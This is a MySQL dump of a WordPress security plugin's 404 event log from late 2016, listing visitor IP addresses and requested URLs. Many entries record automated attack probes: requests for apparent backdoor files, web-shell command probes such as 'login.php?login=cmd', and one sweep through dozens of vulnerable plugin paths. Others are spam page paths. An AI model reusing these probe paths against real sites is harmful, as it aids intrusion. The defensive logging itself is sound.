-- All In One WP Security & Firewall 4.2.5
-- MySQL dump
-- 2017-03-22 06:57:53

SET NAMES utf8;
SET foreign_key_checks = 0;

DROP TABLE IF EXISTS `cmrfu_aiowps_events`;

CREATE TABLE `cmrfu_aiowps_events` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `event_type` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `username` varchar(150) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_id` bigint(20) DEFAULT NULL,
  `event_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ip_or_host` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `referer_info` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `url` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `country_code` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `event_data` longtext COLLATE utf8mb4_unicode_ci,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1082 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_aiowps_events` VALUES("582","404","","0","2016-11-21 13:32:48","202.179.189.226","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("583","404","","0","2016-11-21 13:33:29","125.163.254.188","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("584","404","","0","2016-11-21 13:41:06","36.79.174.100","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("585","404","","0","2016-11-21 13:46:54","103.60.172.130","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("586","404","","0","2016-11-21 13:50:06","182.118.25.204","http://www.ismido.com.tr/stds/ek-vaari-ha-aayushman-video-song.html","/stds/ek-vaari-ha-aayushman-video-song.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("587","404","","0","2016-11-21 13:54:07","41.233.205.127","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("588","404","","0","2016-11-21 13:59:00","220.181.108.116","","/stds/suside-krna-mainu-punjabi-2016.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("589","404","","0","2016-11-21 14:00:30","27.7.251.73","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("590","404","","0","2016-11-21 14:00:34","159.203.196.79","213.136.86.110","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("591","404","","0","2016-11-21 14:03:59","95.139.245.102","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("592","404","","0","2016-11-21 14:09:27","103.255.4.34","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("593","404","","0","2016-11-21 14:19:50","175.139.100.77","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("594","404","","0","2016-11-21 14:22:43","82.199.193.93","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("595","404","","0","2016-11-21 14:25:38","67.215.228.20","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("596","404","","0","2016-11-21 14:34:15","46.70.134.241","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("597","404","","0","2016-11-21 14:39:26","109.184.246.231","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("598","404","","0","2016-11-21 14:47:23","130.255.36.255","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("599","404","","0","2016-11-21 15:12:58","180.76.15.33","","/stds/mi-3s-prime-child-mode-pattern.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("600","404","","0","2016-11-21 15:29:54","188.40.81.84","","/wp-includes/SimplePie/Net/wp-conns.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("601","404","","0","2016-11-21 16:14:32","66.249.64.208","","/stds/what-is-the-benefit-of-mustard-oil-for-breast-enlargement.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("602","404","","0","2016-11-21 16:19:57","180.76.15.26","","/stds/esposa-joven-muerte-de-asad.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("603","404","","0","2016-11-21 16:20:00","176.119.3.70","","/wp-content/plugins/jquery-colorbox/css/syslib.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("604","404","","0","2016-11-21 17:26:56","180.76.15.8","","/stds/oa-bokep-li.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("605","404","","0","2016-11-21 17:29:41","192.71.249.191","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("606","404","","0","2016-11-21 17:29:42","192.71.249.191","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("607","404","","0","2016-11-21 17:33:30","185.129.148.190","","/login.php?login=cmd","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("608","404","","0","2016-11-21 17:48:49","123.125.71.31","","/stds/ik-vaari-haa-krde-song-ayushmaan-khurana.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("609","404","","0","2016-11-21 17:49:43","220.181.108.109","","/stds/ik-vaari-haa-krde-song-ayushmaan-khurana.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("610","404","","0","2016-11-21 17:56:11","66.249.64.208","","/stds/phn-ma-photo-sung-by-neha-kakkar-download-free.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("611","404","","0","2016-11-21 17:59:50","188.40.81.84","","/wp-content/uploads/2013/10/login.php?cmd=1","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("612","404","","0","2016-11-21 18:01:17","66.249.64.197","","/stds/juego-de-rescatando-a-mimi-de-german-juego.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("613","404","","0","2016-11-21 19:37:57","188.40.81.84","","/wp-content/uploads/2013/10/login.php?login=cmd","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("614","404","","0","2016-11-21 19:46:43","5.149.255.131","http://www.ismido.com.tr/","/wordpress","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("615","404","","0","2016-11-21 20:25:56","66.249.64.197","","/stds/pink-poem-by-amitabh.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("616","404","","0","2016-11-21 20:26:38","66.249.64.202","","/foa/rohel.php?hl=odia-Blaina-kna-kalase-mp3-dj-song","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("617","404","","0","2016-11-21 21:05:54","62.210.148.91","http://www.ismido.com.tr/Good-404-Sorry.php","/Good-404-Sorry.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("618","404","","0","2016-11-21 21:09:37","180.76.15.156","","/stds/jharkhandwap.in-mohhrram-dj-quwali.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("619","404","","0","2016-11-21 22:55:46","123.125.71.110","","/stds/ciri-cirinya-bibir-orang-pernah-berciu.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("620","404","","0","2016-11-21 23:29:42","91.200.12.60","http://www.google.com/","/wp-content/themes/skinizer/framework/_scripts/valums_uploader/php.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("621","404","","0","2016-11-21 23:32:46","180.76.15.144","","/stds/super-dancet-mega-odition-downlod.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("622","404","","0","2016-11-22 00:09:11","185.129.148.190","","/wp-content/plugins/contact-form-7/login.php?login=cmd","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("623","404","","0","2016-11-22 01:00:31","180.76.15.140","","/stds/fotos-de-lady-bug-y-cat-noa.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("624","404","","0","2016-11-22 02:37:18","5.45.67.17","http://www.herkonyapi.com/wp-content/themes/twentythirteen/author.php","/wp-content/themes/twentythirteen/author.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("625","404","","0","2016-11-22 04:37:20","185.129.148.190","","/wp-content/plugins/contact-form-7/login.php?login=cmd","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("626","404","","0","2016-11-22 05:42:06","66.249.64.208","","/stds/agenda-sonidera-2016.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("627","404","","0","2016-11-22 05:42:36","66.249.64.202","","/foa/rohel.php?hl=kudi-nasesi-chadgai-songs-download","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("628","404","","0","2016-11-22 06:43:24","180.76.15.146","","/stds/download-tuzat-jiv-rangla-he-marathi-serial-thitle-song-320-kbps.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("629","404","","0","2016-11-22 07:03:27","66.249.64.202","","/stds/video-de-barbie-velez-cupando-pija.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("630","404","","0","2016-11-22 08:35:33","123.125.71.16","","/stds/password-pes-17-crack-3dm-v1-bug-fixed.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("631","404","","0","2016-11-22 08:39:43","123.125.71.78","","/stds/password-pes-17-crack-3dm-v1-bug-fixed.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("632","404","","0","2016-11-22 08:55:10","66.249.64.208","","/stds/evaluation-5eme-sur-les-carolingiens.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("633","404","","0","2016-11-22 09:33:08","180.76.15.32","","/stds/videos-de-heroes-inmortales-2016.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("634","404","","0","2016-11-22 10:47:07","37.144.234.11","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("635","404","","0","2016-11-22 10:52:13","202.80.216.116","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("636","404","","0","2016-11-22 10:54:53","103.242.155.63","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("637","404","","0","2016-11-22 11:21:05","213.135.147.51","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("638","404","","0","2016-11-22 11:21:18","180.76.15.9","","/stds/co-dau-8tuoi-phan-11-tap-88.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("639","404","","0","2016-11-22 11:24:08","45.122.233.7","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("640","404","","0","2016-11-22 11:43:09","85.29.143.140","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("641","404","","0","2016-11-22 12:00:05","87.107.145.139","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("642","404","","0","2016-11-22 12:00:35","112.198.75.35","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("643","404","","0","2016-11-22 12:01:10","203.109.66.6","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("644","404","","0","2016-11-22 12:05:16","37.212.93.252","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("645","404","","0","2016-11-22 12:06:52","36.74.35.81","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("646","404","","0","2016-11-22 12:22:39","95.71.244.163","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("647","404","","0","2016-11-22 12:34:56","41.212.48.140","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("648","404","","0","2016-11-22 12:43:08","77.34.183.87","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("649","404","","0","2016-11-22 12:47:54","185.23.66.54","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("650","404","","0","2016-11-22 12:56:30","193.193.239.123","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("651","404","","0","2016-11-22 13:03:59","66.249.64.197","","/foa/rohel.php?hl=aee-dil-hai-muskil-all-video-song-hd-quality","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("652","404","","0","2016-11-22 13:19:48","42.112.189.70","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("653","404","","0","2016-11-22 13:32:07","220.181.108.120","","/stds/guru-taat-pribadi.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("654","404","","0","2016-11-22 13:39:53","123.17.4.172","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("655","404","","0","2016-11-22 13:43:55","94.70.254.218","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("656","404","","0","2016-11-22 13:45:53","109.252.67.236","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("657","404","","0","2016-11-22 13:48:26","77.75.76.161","","/stds/tujyat-jiv-guntla.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("658","404","","0","2016-11-22 13:53:47","212.112.119.198","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("659","404","","0","2016-11-22 13:59:56","178.91.16.239","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("660","404","","0","2016-11-22 14:15:37","85.140.3.1","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("661","404","","0","2016-11-22 14:25:06","197.161.196.141","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("662","404","","0","2016-11-22 14:31:16","91.200.12.60","http://www.google.com/","/wp-content/themes/skinizer/framework/_scripts/valums_uploader/php.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("663","404","","0","2016-11-22 14:44:48","213.108.172.70","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("664","404","","0","2016-11-22 14:54:20","113.162.244.1","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("665","404","","0","2016-11-22 15:17:06","2.92.246.72","http://www.ismido.com.tr/","/wp-content/themes/er-leaf/js/html5.js","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("666","404","","0","2016-11-22 15:23:04","46.4.116.197","","/roplt4/%E0%A6%AC%E0%A6%A8%E0%A7%8D%E0%A6%A7%E0%A7%81%E0%A6%B0-%E0%A6%AE%E0%A6%BE/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("667","404","","0","2016-11-22 15:23:08","46.4.116.197","","/roplt4/%E0%A6%AC%E0%A6%A8%E0%A7%8D%E0%A6%A7%E0%A7%81%E0%A6%B0-%E0%A6%B8%E0%A7%87%E0%A6%95%E0%A7%8D%E0%A6%B8%E0%A7%80-%E0%A6%AE%E0%A6%BE%E0%A6%95%E0%A7%87-%E0%A6%9A%E0%A7%8B%E0%A6%A6-3/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("668","404","","0","2016-11-22 16:25:42","66.249.64.208","","/foa/rohel.php?hl=dj-bhojpuri-chhath-puja--song-2016","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("669","404","","0","2016-11-22 16:26:29","66.249.64.197","","/stds/bring-it-on-baby-vip.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("670","404","","0","2016-11-22 16:47:57","66.249.64.208","","/stds/contoh-cerita-fantasi-peri-sungai.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("671","404","","0","2016-11-22 17:07:59","180.76.15.152","","/stds/episode-dimna-pragya-dan-abhi-saling-jatuh-ci.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("672","404","","0","2016-11-22 17:10:48","192.71.249.191","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("673","404","","0","2016-11-22 17:10:55","192.71.249.191","","/wp-content/plugins/jquery-colorbox/js/wp-jqmain.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("674","404","","0","2016-11-22 19:45:19","123.125.71.89","","/stds/sila-film-odcinek-29.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("675","404","","0","2016-11-22 21:07:46","62.210.148.91","http://www.ismido.com.tr/xmlrpc-activate.php","/xmlrpc-activate.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("676","404","","0","2016-11-22 22:07:23","123.125.71.33","","/stds/sila-film-odcinek-29.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("677","404","","0","2016-11-22 22:42:25","180.76.15.153","","/stds/sonare-sonare-kaca-ainare.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("678","404","","0","2016-11-23 16:19:25","195.154.222.99","","/login.php?login=cmd","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("679","404","","0","2016-11-23 16:19:28","195.154.222.99","","/login.php?login=cmd","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("680","404","","0","2016-11-24 02:27:44","66.249.66.162","","/urun.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("681","404","","0","2016-11-25 08:55:59","66.249.66.158","","/hijyen.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("682","404","","0","2016-11-25 16:40:43","66.249.79.137","","/mobile/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("683","404","","0","2016-11-25 18:31:41","66.249.79.141","","/author/herkon123/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("684","404","","0","2016-11-26 02:12:21","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/1211715431.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("685","404","","0","2016-11-26 16:53:01","66.249.69.14","","/author/herkon123/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("686","404","","0","2016-11-27 15:06:50","66.249.69.18","","/author/herkon123/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("687","404","","0","2016-11-28 02:10:35","66.249.69.18","","/author/herkon123/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("688","404","","0","2016-11-28 03:50:16","66.249.69.10","","/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("689","404","","0","2016-11-28 06:21:48","66.249.69.10","","/.well-known/assetlinks.json","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("690","404","","0","2016-11-28 09:12:31","66.249.66.153","","/.well-known/apple-app-site-association","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("691","404","","0","2016-11-28 09:15:14","157.55.39.163","","/turkce_r1_c1.gif","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("692","404","","0","2016-11-28 11:44:37","141.8.183.3","","/wp-content/uploads/wpcf7_captcha/1347771119.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("693","404","","0","2016-11-29 06:08:20","198.204.238.170","","/_core/utils/elfinder/elfinder.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("694","404","","0","2016-11-29 06:08:21","198.204.238.170","","/packages/ahmadazimi/laravel-media-manager/elfinder.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("695","404","","0","2016-11-29 06:08:21","198.204.238.170","","/modules/tadtools/ckeditor/elFinder/elfinder.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("696","404","","0","2016-11-29 06:08:22","198.204.238.170","","/common/js/elfinder_2.0/elfinder.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("697","404","","0","2016-11-29 15:18:30","66.249.92.72","","/wp-content/uploads/wpcf7_captcha/1358404880.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("698","404","","0","2016-11-29 17:55:43","66.249.92.72","","/wp-content/uploads/wpcf7_captcha/1358404880.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("699","404","","0","2016-11-29 22:35:38","66.249.92.74","","/wp-content/uploads/wpcf7_captcha/3710996501.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("700","404","","0","2016-11-30 00:02:08","66.249.92.72","","/wp-content/uploads/wpcf7_captcha/3710996501.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("701","404","","0","2016-11-30 06:10:01","66.249.92.76","","/wp-content/uploads/wpcf7_captcha/1358404880.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("702","404","","0","2016-11-30 08:52:23","157.55.39.223","","/turkce_r3_c1.gif","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("703","404","","0","2016-11-30 12:37:06","66.249.92.74","","/wp-content/uploads/wpcf7_captcha/3710996501.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("704","404","","0","2016-11-30 18:16:52","190.131.209.130","","/wp-content/plugins/wpstorecart/lgpl.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("705","404","","0","2016-11-30 18:16:56","190.131.209.130","","/wp-content/plugins/magic-fields/MF_Constant.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("706","404","","0","2016-11-30 18:16:56","190.131.209.130","","/wp-content/plugins/category-grid-view-gallery/cat_grid.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("707","404","","0","2016-11-30 18:16:56","190.131.209.130","","/wp-content/plugins/wp-homepage-slideshow/functions.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("708","404","","0","2016-11-30 18:16:56","190.131.209.130","","/wp-content/plugins/wp-image-news-slider/functions.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("709","404","","0","2016-11-30 18:16:56","190.131.209.130","","/wp-content/plugins/zingiri-web-shop/admin.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("710","404","","0","2016-11-30 18:16:57","190.131.209.130","","/wp-content/plugins/fcchat/default.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("711","404","","0","2016-11-30 18:16:57","190.131.209.130","","/wp-content/plugins/gallery-plugin/gallery-plugin.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("712","404","","0","2016-11-30 18:16:58","190.131.209.130","","/wp-content/plugins/wp-e-commerce/license.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("713","404","","0","2016-11-30 18:17:01","190.131.209.130","","/wp-content/plugins/wp-filemanager/fm.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("714","404","","0","2016-11-30 18:17:02","190.131.209.130","","/wp-content/plugins/nmedia-user-file-uploader/readme.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("715","404","","0","2016-11-30 18:17:02","190.131.209.130","","/wp-content/plugins/wp-property/action_hooks.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("716","404","","0","2016-11-30 18:17:02","190.131.209.130","","/wp-content/plugins/resume-submissions-job-postings/installer.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("717","404","","0","2016-11-30 18:17:05","190.131.209.130","","/wp-content/plugins/nextgen-gallery/changelog.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("718","404","","0","2016-11-30 18:17:05","190.131.209.130","","/wp-content/plugins/user-avatar/readme.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("719","404","","0","2016-11-30 18:17:05","190.131.209.130","","/wp-content/plugins/wpmarketplace/readme.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("720","404","","0","2016-11-30 18:17:05","190.131.209.130","","/wp-content/plugins/another-wordpress-classifieds-plugin/AWPCP.po","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("721","404","","0","2016-11-30 18:17:05","190.131.209.130","","/wp-content/plugins/wpmarketplace/readme.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("722","404","","0","2016-11-30 18:17:05","190.131.209.130","","/wp-content/plugins/user-meta/readme.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("723","404","","0","2016-11-30 18:17:05","190.131.209.130","","/wp-content/plugins/custom-content-type-manager/index.html","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("724","404","","0","2016-11-30 18:17:06","190.131.209.130","","/wp-content/plugins/user-photo/admin.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("725","404","","0","2016-11-30 18:17:06","190.131.209.130","","/wp-content/plugins/wp-editor/readme.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("726","404","","0","2016-11-30 18:17:06","190.131.209.130","","/wp-content/plugins/front-end-upload/destination.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("727","404","","0","2016-11-30 18:17:06","190.131.209.130","","/wp-content/plugins/font-uploader/font-uploader-free.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("728","404","","0","2016-11-30 18:17:06","190.131.209.130","","/wp-content/plugins/front-end-upload/destination.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("729","404","","0","2016-11-30 18:17:06","190.131.209.130","","/wp-content/plugins/ninja-forms/ninja_forms.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("730","404","","0","2016-11-30 18:17:06","190.131.209.130","","/wp-content/plugins/auto-attachments/a-a.css","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("731","404","","0","2016-11-30 18:17:07","190.131.209.130","","/wp-content/plugins/cimy-user-extra-fields/README_OFFICIAL.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("732","404","","0","2016-11-30 18:17:07","190.131.209.130","","/wp-content/plugins/simple-dropbox-upload-form/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("733","404","","0","2016-11-30 18:30:01","190.131.209.130","","/wp-content/plugins/mac-dock-gallery/bugslist.txt","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("734","404","","0","2016-11-30 19:53:34","66.249.92.72","","/wp-content/uploads/wpcf7_captcha/1358404880.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("735","404","","0","2016-12-01 01:22:37","66.249.92.74","","/wp-content/uploads/wpcf7_captcha/3710996501.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("736","404","","0","2016-12-01 04:07:39","195.154.194.179","","/license.php","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("737","404","","0","2016-12-01 06:13:38","66.249.92.72","https://www.ismido.com.tr/","/wp-content/uploads/wpcf7_captcha/3612972554.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("738","404","","0","2016-12-01 09:14:38","66.249.92.74","","/wp-content/uploads/wpcf7_captcha/1358404880.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("739","404","","0","2016-12-01 10:45:31","66.249.92.74","","/wp-content/uploads/wpcf7_captcha/3612972554.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("740","404","","0","2016-12-01 12:55:23","66.249.92.76","","/wp-content/uploads/wpcf7_captcha/3612972554.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("741","404","","0","2016-12-01 15:04:04","66.249.92.74","","/wp-content/uploads/wpcf7_captcha/3710996501.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("742","404","","0","2016-12-01 23:09:05","66.249.92.76","","/wp-content/uploads/wpcf7_captcha/1358404880.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("743","404","","0","2016-12-01 23:32:46","66.249.92.74","","/wp-content/uploads/wpcf7_captcha/1522867148.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("744","404","","0","2016-12-02 00:13:34","66.249.92.74","","/wp-content/uploads/wpcf7_captcha/1522867148.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("745","404","","0","2016-12-02 02:15:01","66.249.92.76","","/wp-content/uploads/wpcf7_captcha/3612972554.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("746","404","","0","2016-12-02 03:01:13","66.249.92.74","","/wp-content/uploads/wpcf7_captcha/3710996501.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("747","404","","0","2016-12-02 11:55:16","66.249.66.145","","/author/herkon123/","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("748","404","","0","2016-12-02 12:30:33","66.249.92.74","","/wp-content/uploads/wpcf7_captcha/1522867148.png","","");
INSERT INTO `cmrfu_aiowps_events` VALUES("749","404","","0","2016-12-02 16:10:41","66.249.92.76","","/wp-content/uploads/wpcf7_captcha/3612972554.png","","");
